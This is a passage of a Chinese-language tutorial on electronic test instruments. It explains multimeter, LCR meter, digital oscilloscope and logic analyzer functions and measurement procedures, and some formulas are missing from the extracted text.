title="万用表的妙用"></a>万用表的妙用</h3><ol><li>短路的测量方法：使用蜂鸣档直接测量，当蜂鸣器鸣叫时为短路，反之为正常。</li><li>判断是否线路中是否有电：数字的交流电压挡很灵敏，哪怕周围有很小的感应电压都可以有显示。根据这一特点，可以当作测试电笔用。</li></ol><p>用法如下：将万用表打到AC20V挡，黑表笔悬空，手持红表笔与所测路线或器件相接触，这时万用表会有显示，如果显示数字在几伏到十几伏之间（不同的万用表会有不同的显示），表明该线路或器件带电，如果显示为零或很小，表明该线路或器件不带电。</p><p><strong>数字万用表</strong>（Multimeter）是一种多用途的电子测量仪器，可以用于测量电路当中的<code>电压</code>、<code>电流</code>、<code>电阻</code>、<code>电感</code>、<code>晶体管</code>等数据。手持式数字万用表的的显示规格通常为<strong>三位半</strong>或者<strong>四位半</strong>，其中三位半是指有三位数字可以显示 <code>0 ~ 9</code>，而最高位只能显示数字 <code>1</code>，而四位半同理。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111902938.png"></p><ul><li><strong>LPF</strong>：<strong>低通滤波器</strong>（Low-Pass Filter）是在测量过程当中，允许低频待测信号正常通过，而超过临界值的高频信号则会被阻隔与减弱；</li><li><strong>NCV</strong>：<strong>非接触式电压</strong>（Non-contact voltage）功能可以用于在不与导线产生物理接触的情况下，探测特定频率的<strong>交流电压</strong>信号；</li><li><strong>V.F.C</strong>：<strong>变频电压电流</strong>测量，进入该模式以后，可以准确的测量变频的电压与电流；</li><li><strong>hFE</strong>：<strong>共发射极混合参数正向电流增益</strong>（<strong>H</strong>ybrid Parameter <strong>F</strong>orward Current Gain，Common <strong>E</strong>mitter），即<strong>晶体管</strong>在固定直流偏置下的电流放大倍数；</li><li><strong>True RMS</strong>：<strong>真有效值</strong>是测量<strong>交流信号</strong>的一种有效方法，也称为<strong>真均方根</strong>（True Root Mean Square）值，其计算方法是将一个交流波形划分为很多部分，然后求解每个部分振幅的<strong>平方</strong>，接着计算这些平方值的<strong>平均值</strong>，最后将平均值<strong>开方</strong>；</li></ul><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111902544.png"></p><h3 id="判断三极管类型"><a href="#判断三极管类型" class="headerlink" title="判断三极管类型"></a>判断三极管类型</h3><p>数字万用表判断三极管属于 NPN 还是 PNP 类型，需要使用到<strong>二极管档位</strong>，此时<code>红表笔</code>相当于电池正极，<code>黑表笔</code>相当于是电池负极。由于三极管的 <strong>B</strong>、<strong>C</strong>、<strong>E</strong> 极之间都存在着 PN 结，当表笔向 PN 结施加<strong>正向电压</strong>时就能够导通（导通电压约 <code>0.7V</code> 左右），本测量方法正是基于这个原理。</p><h2 id="指针万用表-Analog-Multimeter"><a href="#指针万用表-Analog-Multimeter" class="headerlink" title="指针万用表 Analog Multimeter"></a>指针万用表 Analog Multimeter</h2><p>指针万用表主要分为<strong>内磁式</strong>（表针游丝安装在环形磁铁内部，受外磁场干扰较小，磁路短。由于用磁材料较少，导致难以形成较强磁场，灵敏度相对较低）和<strong>外磁式</strong>（表针游丝安装在环形磁铁外部，由于用磁材料较多，灵敏度高，线性好，但是也存在着易受干扰的问题）。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111902169.png"></p><p>虽然相比于<strong>数字万用表</strong>而言，<strong>指针万用表</strong>读数不便，且精度相对较差。但是由于指针万用表<strong>电阻档</strong>的测量输出电压较高，因而可以用于判断 IGBT 等大功率器件引脚的通断状态。笔者当前使用的是一台由 <a href="http://www.njtianyu.cn/"><strong>南京天宇电子仪表厂</strong></a> 生产的 <strong>T-88N</strong> 型外磁式指针式万用表（可以直接测量频率和电容），下面分别展示了其<strong>表盘</strong>和<strong>档位旋转开关</strong>的示意图：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111903729.png"></p><p>该款外磁式指针式万用表的具体测量技术指标，如下面的表格所示：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111903465.png"></p><h3 id="指针归零"><a href="#指针归零" class="headerlink" title="指针归零"></a>指针归零</h3><ol><li>将万用表水平放置，观察表针是否处于<code>电流</code>或者<code>电压</code>刻度的<strong>零点</strong>，如果不在则需要通过【指针归零】旋钮将指针归零；</li><li>通过表盘调整<strong>测量项目</strong>以及<strong>量程</strong>，在被测量程未知的情况下，需要从最大量程开始进行测量，如果指针偏转角度太小，无法精确读数，则需要降低量程（通常以指针偏转角度大于最大刻度的 <strong>30%</strong> 为合理量程，即指针停留在表盘的 至 位置处）；</li></ol><h3 id="测量电流表"><a href="#测量电流表" class="headerlink" title="测量电流表"></a>测量电流表</h3><ol><li>将红色表笔连接到电流流入的一端，而将黑表笔连接到电流流出的一端，如果被测电流方向未知，则可以将表笔连接到电路的其中一端，而另一支表笔快速触碰电路的另外一端，如果指针<strong>向右摆动</strong>就说明接线正确，而如果指针<strong>向左摆动</strong>（低于零点）则说明接线错误，需要调换两支表笔的位置；</li><li>当指针的偏转角度大于最大刻度的 <strong>30%</strong> 时，则需要使用更大的量程（量程越大，分流电阻越小，电流表的等效内阻也就越小，此时被测电路引入的误差也就会越小）；</li><li>测量较大的电流（例如 <code>500mA</code>）时，禁止在测量过程当中拨动量程开关，以免产生电弧烧坏开关触点；</li></ol><h3 id="测量电压"><a href="#测量电压" class="headerlink" title="测量电压"></a>测量电压</h3><ol><li>红色表笔连接至电压较高的一端，而黑色表笔连接至电压较低的一端，不明确极性的情况下，可以采用前面的方式测试极性（<strong>指针向右偏转</strong>可以正常测量，<strong>指针向左偏转</strong>则需要调换表笔位置之后进行测量）；</li><li>当指针偏转角度大于或者等于最大刻度的 <strong>30%</strong> 时，就应当切换到更大的量程档位（量程越大，万用表的内阻就会越大，引入到被测电路的误差也就会越小）；</li><li>测量交流电压时，不需要考虑表笔的极性问题（被测交流电压只能是正弦波，其频率应当小于或者等于万用表的允许工作频率）；</li></ol><blockquote><p><strong>注意</strong>：不要在测量较高电压的时候，拨动量程切换开关，从而避免产生电弧烧坏开关触点。</p></blockquote><h3 id="测量电阻"><a href="#测量电阻" class="headerlink" title="测量电阻"></a>测量电阻</h3><p>使用指针式万用表测量<strong>电阻</strong>的操作步骤如下所示：</p><ol><li>选择合适的<strong>量程档位</strong>（进行测量时，指针的理想位置就当停留在表盘的 1&#x2F;3 至 2&#x2F;3 处）；</li><li><strong>短接红黑表笔</strong>，通过【电阻调零】按钮对其进行调零；</li><li>将红黑表笔跨接在电阻两端（手只握住电阻一端，防止人体并联在电阻上，影响测量结果）；</li><li><strong>正确读数 &#x3D; 指针读数 x 量程倍率</strong>；</li></ol><blockquote><p><strong>注意</strong>：指针万用表在电阻档状态下，电流是从红色表笔流出，黑色表笔流入。</p></blockquote><h3 id="测量二极管"><a href="#测量二极管" class="headerlink" title="测量二极管"></a>测量二极管</h3><p>指针式万用表测量二极管，是根据二极管在<strong>正向导通</strong>时阻值较小，而<strong>反向截止</strong>时阻值较大的原理。</p><ol><li>将档位选择至【x1K】；</li><li>短接红黑表笔进行电阻调零；</li><li>将红黑表笔分别连接至二极管引脚；</li><li>如果黑色表笔连接的是二极管正极，而红色表笔连接的是二极管负极，那么二极管就会处于<strong>正向导通</strong>的状态，此时指针所指向的阻值将会较小；反之，指针所指向的阻值就会较大；</li></ol><h3 id="判断三极管类型-1"><a href="#判断三极管类型-1" class="headerlink" title="判断三极管类型"></a>判断三极管类型</h3><ol><li>将档位选择至【x1K】，短接表笔电阻调零；</li><li>将<strong>黑色表笔</strong>连接至三极管的<strong>基极</strong>，红色表笔分别连接其余两只引脚，如果两次测量的指针都存在明显摆动就属于 <strong>NPN 型</strong>；</li><li>将<strong>红色表笔</strong>连接至三极管的<strong>基极</strong>，黑色表笔分别连接其余两只引脚，如果两次测量的指针都存在明显摆动则属于 <strong>PNP 型</strong>；</li></ol><h2 id="数字电桥-LCR-Meter"><a href="#数字电桥-LCR-Meter" class="headerlink" title="数字电桥 LCR Meter"></a>数字电桥 LCR Meter</h2><p><strong>数字电桥</strong>（LCR Meter）是一种用于测量<code>电感</code>、<code>电容</code>、<code>电阻</code>元件参数的仪器，其<strong>主参数</strong>不仅能显示出元件值，<strong>副参数</strong>还能够反映 <code>Q</code>、<code>D</code>、<code>Z</code>、<code>Lp</code>、<code>Ls</code>、<code>Cp</code>、<code>Cs</code>、<code>Kp</code>、<code>Ks</code> 等参数。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111903404.png"></p><ul><li><strong>主参数</strong>：<strong>电感</strong>（L）、<strong>电容</strong>（C）、<strong>电阻</strong>（R）、<strong>阻抗</strong>（Z）；</li><li><strong>副参数</strong>： <strong>电抗</strong>（X）、<strong>损耗因子</strong>（D）、<strong>品质因数</strong>（Q）、<strong>阻抗角</strong>（θ）、<strong>等效串联电阻</strong>（ESR）；</li><li><strong>等效模型</strong>：由于实际的电感、电容、电阻并非<strong>理想阻抗元件</strong>，而是以串并联形式呈现为<strong>复合阻抗元件</strong>，所以需要将元件等效为简单的<strong>串联</strong>（<strong>S</strong>eries [ˈsɪəriːz]）等效、<strong>并联</strong>（<strong>P</strong>arallel [pærəlel]）等效模型进行测量；</li></ul><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111903471.png"></p><blockquote><p><strong>注意</strong>：通常情况下，<strong>低阻抗元件</strong>使用<strong>串联等效模型</strong>，<strong>高阻抗元件</strong>使用<strong>并联等效模型</strong>。</p></blockquote><ul><li><strong>直流电阻</strong>测量模式（DCR）：可以测量线圈、变压器等电子元件的直流阻抗；</li><li><strong>电解电容</strong>测量模式（ELECT CAP）：使用时需要注意元件的连接方向，红色开尔文夹连接电解电容正极，黑色开尔文夹连接电解电容负极；</li></ul><h2 id="数字存储示波器-DSO"><a href="#数字存储示波器-DSO" class="headerlink" title="数字存储示波器 DSO"></a>数字存储示波器 DSO</h2><p><strong>数字存储示波器</strong>（DSO，Digital Storage Oscilloscope [əˈsɪləskoʊp]）是一种将电信号数字化之后再重建波形，并且具有记忆、存储波形信号功能的电子仪器。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111903710.png"></p><h3 id="采样系统"><a href="#采样系统" class="headerlink" title="采样系统"></a>采样系统</h3><h4 id="采样原理"><a href="#采样原理" class="headerlink" title="采样原理"></a>采样原理</h4><p><strong>奈奎斯特</strong>（Nyquist）采样原理认为，对于<strong>最大频率</strong> 的带宽有限制信号而言，<strong>等距采样频率</strong> 必须超过<strong>最大频率</strong> 两倍以上，才能够产生出不会发生混叠的信号。</p><h4 id="采样率"><a href="#采样率" class="headerlink" title="采样率"></a>采样率</h4><p>数字示波器的实际采样率由当前的水平时基档位决定，采样率不足会引起波形出现<code>失真</code>、<code>混叠</code>、<code>漏失</code>等问题，从而造成波形无法正常进行显示：</p><p><strong>波形失真</strong>：由于采样率低造成某些波形细节缺失，使示波器采样显示的波形与实际信号存在较大差异；</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111904280.png"></p><p><strong>波形混叠</strong>：由于采样率低于实际信号频率的 <strong>2</strong> 倍，对采样数据进行重建时的波形频率小于实际信号的频率；</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111904674.png"></p><p><strong>波形漏失</strong>：由于采样率过低，对采样数据进行重建时的波形没有反映全部实际信号；</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111904711.png"></p><h4 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h4><p>示波器的<strong>带宽</strong>是指按照 <code>3dB</code> 衰减输入信号幅值的最低频率，对于没有超过示波器最大频率 的频率分量而言，所需要的采样率 为示波器带宽 的两倍。</p><p><img src="http://www.uinio.com/Electronics/Instrument/DSO/Sample/4.png"></p><p>由于数字方波信号由基本频率位置的<code>正弦波</code>和多个<code>奇次谐波</code>组成，具有超出其基本频率的分量，所以正常显示波形的采样率 应当高于带宽 的 4 倍以上。</p><p><img src="http://www.uinio.com/Electronics/Instrument/DSO/Sample/5.png"></p><h4 id="存储深度"><a href="#存储深度" class="headerlink" title="存储深度"></a>存储深度</h4><p>存储深度是指示波器在<strong>每一次触发</strong>采集当中，所能够存储的<strong>波形点数</strong>。</p><p><a href="http://www.uinio.com/Electronics/Instrument/DSO/Sample/6.png"><img src="http://www.uinio.com/Electronics/Instrument/DSO/Sample/6.png"></a></p><p>存储深度 （单位为 <code>pts</code>）、采样率 （单位为 <code>Sa/s</code>）、水平时基档位 （单位为 <code>s/div</code>）、屏幕水平方向格数 （单位为 <code>div</code>） 三者的关系满足如下方程式：</p><blockquote><p><strong>注意</strong>：在相同的水平时基档位下，<strong>高存储深度</strong>可以保证<strong>高采样率</strong>。</p></blockquote><h4 id="插值方式"><a href="#插值方式" class="headerlink" title="插值方式"></a>插值方式</h4><p>通常情况下，示波器获取的采样点难以直观进行观察，为了提高信号的可视性，示波器通常会采用<strong>插值法</strong>进行显示。这里的<strong>插值法</strong>是一种连接各个采样点，并利用采样点推算出整个波形面貌的处理方法，主要分为<strong>线性插值 x</strong> 和<strong>正弦插值 sinx&#x2F;x</strong> 两种方式：</p><p><a href="http://www.uinio.com/Electronics/Instrument/DSO/Sample/7.png"><img src="http://www.uinio.com/Electronics/Instrument/DSO/Sample/7.png"></a></p><ul><li><strong>线性插值 x</strong>：相邻采样点之间以<strong>直线</strong>相互连接，该方式仅限于只需重建边缘的信号，例如<code>方波</code>；</li><li><strong>正弦插值 sinx&#x2F;x</strong>：相邻采样点之间以<strong>曲线</strong>相互连接，该方式通用性更强，当采样速率为带宽的 <code>3 ~ 5</code> 倍时，建议采用该方法；</li></ul><h4 id="Run-Stop-Single-触发控制"><a href="#Run-Stop-Single-触发控制" class="headerlink" title="Run&#x2F;Stop &amp; Single 触发控制"></a>Run&#x2F;Stop &amp; Single 触发控制</h4><ul><li>【Run&#x2F;Stop】按钮：开始或者停止触发采集，停止之后，示波器会显示最后一次采集到的信号；</li><li>【Single】按钮：仅仅只触发一次，对于后续波形将不再触发采集；</li></ul><h4 id="波形获取方式"><a href="#波形获取方式" class="headerlink" title="波形获取方式"></a>波形获取方式</h4><p>波形的获取方式用于控制如何从<strong>采样点</strong>当中产生出<strong>波形点</strong>，通常需要使用到示波器面板上的【Acquire】按钮。</p><ul><li><strong>普通</strong>：按照<strong>相等的时间间隔</strong>对信号采样以重建波形，该模式对于大多数波形而言，可以生成最佳的显示效果；</li><li><strong>峰值</strong>：根据<strong>采样时间隔内信号的最大值和最小值</strong>，并将这些值作为两个相关的波形点，以此来构建波形；该模式能够捕获发生在波形采样点之间快速变化的信号，从而有效的观察到偶发的窄脉冲，但是会造成显示的噪声较大；该模式可以显示至少与采样周期一样宽度的全部脉冲，便于查看毛刺与窄脉冲；</li><li><strong>平均</strong>：对多次采样的波形进行平均，以减少输入信号上的随机噪声并提高垂直分辨率；平均次数越高，噪声越小并且垂直分辨率越高，但显示的波形对于波形变化的响应就会越慢；</li></ul><h3 id="垂直幅度"><a href="#垂直幅度" class="headerlink" title="垂直幅度"></a>垂直幅度</h3><p>显示屏幕的<strong>垂直</strong>方向上，每一个刻度代表的是<strong>电压幅值</strong>，通常表示为 <code>V/div</code>，目前国产数字示波器的垂直档位调节范围在 <code>500μV/div - 10V/div</code> 之间。</p><h4 id="通道耦合"><a href="#通道耦合" class="headerlink" title="通道耦合"></a>通道耦合</h4><p>设置耦合方式可以滤除不需要的信号，例如：被测信号是一个含有直流偏置的方波信号。</p><ul><li>当耦合方式为<strong>直流</strong>：被测信号含有的<code>直流分量</code>和<code>交流分量</code>都可以通过；</li><li>当耦合方式为<strong>交流</strong>：被测信号含有的<code>直流分量</code>被阻隔；</li><li>当耦合方式为<strong>接地</strong>：被测信号含有的<code>直流分量</code>和<code>交流分量</code>都被阻隔；</li></ul><h4 id="带宽限制"><a href="#带宽限制" class="headerlink" title="带宽限制"></a>带宽限制</h4><p>带宽限制可以减少显示波形中的噪声，例如：被测信号是一个含有高频振荡的脉冲信号。</p><ul><li>关闭带宽限制：被测信号含有的高频分量可以通过；</li><li>带宽限制为 <code>20MHz</code>：被测信号当中大于 <code>20MHz</code> 的高频分量将会被衰减；</li></ul><h4 id="探头衰减比"><a href="#探头衰减比" class="headerlink" title="探头衰减比"></a>探头衰减比</h4><p><strong>衰减比</strong>是指被测信号的<code>显示幅度</code>与被测信号<code>实际幅度</code>之间的比值。</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></pre></td><td><pre><span><span>0.1</span>X       <span>0.1</span> : <span>1</span></span><br><span><span>0.2</span>X       <span>0.2</span> : <span>1</span></span><br><span><span>0.5</span>X       <span>0.5</span> : <span>1</span></span><br><span>1X         <span>1</span>   : <span>1</span></span><br><span></span><br><span>500X       <span>500</span>   : <span>1</span></span><br><span>1000X      <span>1000</span>  : <span>1</span></span><br><span>2000X      <span>2000</span>  : <span>1</span></span><br><span>5000X      <span>5000</span>  : <span>1</span></span><br><span>10000X     <span>10000</span> : <span>1</span></span><br></pre></td></tr></tbody></table><h4 id="波形反相"><a href="#波形反相" class="headerlink" title="波形反相"></a>波形反相</h4><p>关闭波形反相时，波形正常显示；打开波形反相时，波形电压值被<strong>反相</strong>：</p><p><a href="http://www.uinio.com/Electronics/Instrument/DSO/Vertical/1.png"><img src="http://www.uinio.com/Electronics/Instrument/DSO/Vertical/1.png"></a></p><h4 id="通道时滞"><a href="#通道时滞" class="headerlink" title="通道时滞"></a>通道时滞</h4><p>使用示波器进行实际测量时，探头电缆的传输延迟可能带来较大的误差（零点偏移，波形与触发电平线的<strong>交点</strong>相对于触发位置的<strong>偏移量</strong>）。此时通过设定一个延迟时间，可以校正对应通道的零点偏移。</p><p><a href="http://www.uinio.com/Electronics/Instrument/DSO/Vertical/2.png"><img src="http://www.uinio.com/Electronics/Instrument/DSO/Vertical/2.png"></a></p><h3 id="水平时基"><a href="#水平时基" class="headerlink" title="水平时基"></a>水平时基</h3><p>显示屏幕的<strong>水平</strong>方向上，每一个刻度代表的是<strong>时间基准</strong>，通常表示为 <code>S/div</code>，目前国产数字示波器的水平档位调节范围在 <code>1.0ns/div ～ 100s/div</code> 之间。</p><h4 id="时基模式"><a href="#时基模式" class="headerlink" title="时基模式"></a>时基模式</h4><ol><li><strong>YT 模式</strong>：<code>Y</code> 轴表示电压量，<code>X</code> 轴表示时间量；</li><li><strong>XY 模式</strong>：该模式下，示波器将两个输入通道从<code>电压-时间</code>转化为<code>电压-电压</code>，然后使用<strong>李沙育法</strong>测量相同频率的两个信号之间的相位差，下面是相位差的测量原理图：</li></ol><p><a href="http://www.uinio.com/Electronics/Instrument/DSO/Horizontal/1.png"><img src="http://www.uinio.com/Electronics/Instrument/DSO/Horizontal/1.png"></a></p><p>根据 ，其中 <code>A</code>、<code>B</code>、<code>C</code>、<code>D</code> 的定义见上图，而 表示两个通道之间的<strong>相差角</strong>，从而可以推导得到：</p><ul><li>如果椭圆的主轴在 <strong>I</strong>、<strong>III</strong> 象限内，那么求解得到的<strong>相位差角</strong>应当位于 <strong>I</strong>、<strong>IV</strong> 象限内，即 <code>0 ~ π/2</code> 或者 <code>3π/2 ~ 2π</code> 范围内。</li><li>如果椭圆的主轴在 <strong>II</strong>、<strong>IV</strong> 象限内，那么所求得的<strong>相位差角</strong>将会位于 <strong>II</strong>、<strong>III</strong> 象限内，即 <code>π/2 ~ π</code> 或者 <code>π ~ 3π/2</code> 范围内。</li></ul><blockquote><p><strong>注意</strong>：该功能可以用于测量信号经过一个电路网络之后，所产生的相位变化。</p></blockquote><h4 id="滚动-Roll"><a href="#滚动-Roll" class="headerlink" title="滚动 Roll"></a>滚动 Roll</h4><p>滚动 Roll 模式下，波形自右向左滚动刷新显示，波形水平位移和触发控制不起作用。</p><h4 id="慢扫描模式"><a href="#慢扫描模式" class="headerlink" title="慢扫描模式"></a>慢扫描模式</h4><p><strong>慢扫描</strong>模式是指在 <strong>YT</strong> 模式下，当水平时基设定为 <code>50ms/div</code> 甚至更慢时，示波器会首先采集<strong>触发点</strong>左侧的数据，然后等待触发，在触发之后继续绘制<strong>触发点</strong>右侧的波形。应用慢扫描模式观察低频信号时，建议将<strong>通道耦合</strong>方式设置为<strong>直流</strong>。</p><h3 id="触发系统"><a href="#触发系统" class="headerlink" title="触发系统"></a>触发系统</h3><p>数字示波器的触发信源可以是 <code>CH1 ~ CH4</code> 模拟信号通道，也可以选择 <code>AC Line</code> 交流市电输入。</p><h4 id="触发电平"><a href="#触发电平" class="headerlink" title="触发电平"></a>触发电平</h4><p>用于控制波形的触发位置，从而决定波形如何显示：</p><p><a href="http://www.uinio.com/Electronics/Instrument/DSO/Trigger/1.png"><img src="http://www.uinio.com/Electronics/Instrument/DSO/Trigger/1.png"></a></p><h4 id="触发方式"><a href="#触发方式" class="headerlink" title="触发方式"></a>触发方式</h4><ul><li><strong>自动触发</strong>（Auto）：如果指定时间内，没有找到满足触发条件的波形，示波器将会强制采集一帧波形数据；</li><li><strong>普通触发</strong>（Normal）：只有查找到指定触发条件之后，才会进行触发与采集；</li><li><strong>单次触发</strong>（Single）：搜索到指定的触发条件之后，示波器只会触发一次，然后就停止触发；</li><li><strong>强制触发</strong>（Force）：通过手动按下【Force】按钮或者两次【Single】按钮，强制产生一个触发信号；</li></ul><h4 id="触发耦合"><a href="#触发耦合" class="headerlink" title="触发耦合"></a>触发耦合</h4><p><strong>触发耦合</strong>决定信号的哪种分量被传送到触发模块。注意与“通道耦合”进行区别。</p><ul><li><strong>直流耦合</strong>（DC）：允许直流（DC）和交流（AC）信号通过触发路径；</li><li><strong>交流耦合</strong>（AC）：阻挡信号的直流成份，并且衰减低于 <code>8Hz</code> 的信号；当信号具有较大的直流偏移时，使用交流耦合可以获得稳定的边沿触发；</li><li><strong>低频抑制</strong>（LFR）：阻挡信号的直流成份，并且抑制低于 <code>2MHz</code> 的低频分量，当信号当中含有低频分量时，使用 LFR 可以获得稳定的边沿触发；</li><li><strong>高频抑制</strong>（HFR）：抑制信号当中高于 <code>1.2MHz</code> 以上的高频成份；</li></ul><blockquote><p><strong>注意</strong>：触发耦合与通道耦合是完全独立的两个概念，使用时不能进行混淆。</p></blockquote><h4 id="触发释抑"><a href="#触发释抑" class="headerlink" title="触发释抑"></a>触发释抑</h4><p>触发释抑可以稳定的触发复杂波形（例如脉冲序列、调制波），<strong>释抑时间</strong>是指示波器发生正确触发之后到重新启用触发电路之前等待的时间，在释抑时间内，即使满足触发条件，示波器也不会触发，直至释抑时间结束，示波器才会重新启用触发电路。</p><p><a href="http://www.uinio.com/Electronics/Instrument/DSO/Trigger/2.png"><img src="http://www.uinio.com/Electronics/Instrument/DSO/Trigger/2.png"></a></p><p>正确的触发释抑时间通常会略小于一次波形的重复时间，这样可以让重复的波形生成唯一的触发点，通常释抑时间的可调范围为 <code>80ns ~ 1.5s</code>。</p><h4 id="噪声抑制"><a href="#噪声抑制" class="headerlink" title="噪声抑制"></a>噪声抑制</h4><p><strong>噪声抑制</strong>可以抑制信号中的高频噪声，降低示波器被误触发的概率，但是这样同时也会降低触发的灵敏度，需要根据实际酌情使用。</p><h4 id="触发类型"><a href="#触发类型" class="headerlink" title="触发类型"></a>触发类型</h4><p><strong>边沿触发</strong>：在输入信号指定边沿的<code>触发阈 [yù] 值</code>上触发；</p><p><a href="http://www.uinio.com/Electronics/Instrument/DSO/Trigger/3.png"><img src="http://www.uinio.com/Electronics/Instrument/DSO/Trigger/3.png"></a></p><p><strong>斜率触发</strong>：让示波器在指定时间的<code>正斜率</code>和<code>负斜率</code>上触发，适用于观测锯齿波或三角波；</p><p><a href="http://www.uinio.com/Electronics/Instrument/DSO/Trigger/4.png"><img src="http://www.uinio.com/Electronics/Instrument/DSO/Trigger/4.png"></a></p><p><strong>脉宽触发</strong>：在指定宽度的<code>正脉冲</code>或者<code>负脉冲</code>上触发，即当输入信号的脉冲宽度满足条件时，示波器就会触发；</p><p><a href="http://www.uinio.com/Electronics/Instrument/DSO/Trigger/5.png"><img src="http://www.uinio.com/Electronics/Instrument/DSO/Trigger/5.png"></a></p><p><strong>超时触发</strong>：从输入信号的<code>上升下降沿</code>跨过触发电平开始，到相邻的<code>上升下降沿</code>跨过触发电平结束的间隔时间 大于指定的超时时间就会触发；</p><p><a href="http://www.uinio.com/Electronics/Instrument/DSO/Trigger/6.png"><img src="http://www.uinio.com/Electronics/Instrument/DSO/Trigger/6.png"></a></p><p><strong>欠幅触发</strong>：用于触发那些跨越过了一个触发电平，但是未能跨越过另外一个触发电平的脉冲；</p><p><a href="http://www.uinio.com/Electronics/Instrument/DSO/Trigger/7.png"><img src="http://www.uinio.com/Electronics/Instrument/DSO/Trigger/7.png"></a></p><p><strong>码型触发</strong>：查找指定<strong>码型</strong>作为触发条件，码型是任意两个通道的逻辑关系（<code>与</code>、<code>或</code>、<code>与非</code>、<code>或非</code>）组合，每个通道都可以设定为<code>无效</code>、<code>低</code>、<code>高</code>三种类型；</p><p><a href="http://www.uinio.com/Electronics/Instrument/DSO/Trigger/8.png"><img src="http://www.uinio.com/Electronics/Instrument/DSO/Trigger/8.png"></a></p><h3 id="数学运算"><a href="#数学运算" class="headerlink" title="数学运算"></a>数学运算</h3><h4 id="FFT-运算"><a href="#FFT-运算" class="headerlink" title="FFT 运算"></a>FFT 运算</h4><p>使用<strong>快速傅立叶变换</strong>（<strong>FFT</strong>，Fast Fourier Transform Algorithm）可以将<strong>时域信号</strong>转换为<strong>频域分量</strong>（频谱，水平档位从<strong>时间</strong> <code>S</code> 变换为<strong>频率</strong> <code>Hz</code>，垂直档位从<strong>伏特</strong> <code>V</code> 变换为<strong>分贝</strong> <code>dB</code>），从而实现同时观测信号的<code>时域波形</code>和<code>频谱图</code>。通过使用 FFT 运算可以方便的测量<code>谐波分量与失真</code>、<code>直流电源中的噪声特性</code>、<code>分析振动</code>等；</p><p><a href="http://www.uinio.com/Electronics/Instrument/DSO/Math/1.png"><img src="http://www.uinio.com/Electronics/Instrument/DSO/Math/1.png"></a></p><h3 id="电源纹波测量"><a href="#电源纹波测量" class="headerlink" title="电源纹波测量"></a>电源纹波测量</h3><ol><li>选择合适的探头档位，如果被测电源的输出电压较大，或者对于带宽的要求较高，则可以考虑使用 <code>10X</code> 档；正常情况下都建议使用 <code>1X</code> 档，避免不必要的噪声衰减影响纹波质量；除此之外，建议探头上使用<strong>接地弹簧</strong>进行接地，从而避免接地线过长带来的不必要干扰； <a href="http://www.uinio.com/Electronics/Instrument/DSO/1.png"><img src="http://www.uinio.com/Electronics/Instrument/DSO/1.png"></a></li><li>由于纹波属于交流成分，所以示波器的<strong>通道耦合</strong>方式应当选择【交流】，从而限制直流信号的输入；</li><li>酌情选择 <code>20MHz</code> 的带宽限制，滤除不必要的高频噪声；</li><li>触发方式可以选择<strong>边沿触发</strong>，触发模式在【Auto】或者【Normal】状态下皆可；</li></ol><h3 id="晶振信号测量"><a href="#晶振信号测量" class="headerlink" title="晶振信号测量"></a>晶振信号测量</h3><ol><li>由于晶振输出的是交流信号，所以需要将示波器<strong>通道耦合</strong>方式设置为【交流】，从而滤除直流成分；</li><li>由于晶振当中的信号大部分属于高频信号，所以需要将示波器通道与探头的<strong>衰减比</strong>设置为 <code>10X</code>，防止探头带宽过低；</li><li>尽量选择<strong>接地弹簧</strong>来进行接地，避免由于接地线过长而引入不必要的干扰；</li></ol><p><a href="http://www.uinio.com/Electronics/Instrument/DSO/2.png"><img src="http://www.uinio.com/Electronics/Instrument/DSO/2.png"></a></p><blockquote><p><strong>注意</strong>：<strong>无源晶振</strong>通常输出的是<code>正弦波</code>，而<strong>有源晶振</strong>输出的信号可能是<code>正弦波</code>或者<code>方波</code>。</p></blockquote><h2 id="逻辑分析仪-Logic-Analyzer"><a href="#逻辑分析仪-Logic-Analyzer" class="headerlink" title="逻辑分析仪 Logic Analyzer"></a>逻辑分析仪 Logic Analyzer</h2><p><strong>逻辑分析仪</strong>是专门针对<strong>数字信号</strong>的调试工具，可长时间采集信号，并且无波形死区，支持复杂触发定位以及全面的协议内容解析。相比于数字存储示波器，由于逻辑分析仪只采集高低电平，因而更加擅长于分析数字通讯过程和复杂的协议解析。</p><p><a href="http://www.uinio.com/Electronics/Instrument/Logic-Analyzer/0.png"><img src="http://www.uinio.com/Electronics/Instrument/Logic-Analyzer/0.png"></a></p><p><strong>采集时长</strong>和<strong>采样率</strong>是逻辑分析仪的两个主要性能指标，目前市场上的逻辑分析仪都支持<code>高采样率</code>的 <strong>Buffer 模式</strong>，以及<code>较长采集时间</code>的 <strong>Stream 模式</strong>：</p><p><a href="http://www.uinio.com/Electronics/Instrument/Logic-Analyzer/1.png"><img src="http://www.uinio.com/Electronics/Instrument/Logic-Analyzer/1.png"></a></p><ul><li><strong>Buffer 模式</strong>：将信号采集到 DRAM 之后，再通过 USB 传输给上位机；</li><li><strong>Stream 模式</strong>：一边采集信号，一边通过 USB 将信号传递给上位机；</li></ul><h3 id="Stream-模式"><a href="#Stream-模式" class="headerlink" title="Stream 模式"></a>Stream 模式</h3><p>由于 <strong>Stream 模式</strong>实时将采集到的数据通过 USB 传输到电脑内存，最大可以达到 16G 深度，从而可以大大提高波形的记录时长：</p><p><a href="http://www.uinio.com/Electronics/Instrument/Logic-Analyzer/2.png"><img src="http://www.uinio.com/Electronics/Instrument/Logic-Analyzer/2.png"></a></p><blockquote><p><strong>注意</strong>：Stream 模式的实时传输会受到 USB 接口的带宽限制（USB2.0 传输速率上限仅为 <code>480Mbps</code>，但是 USB3.0 传输速率上限可以达到 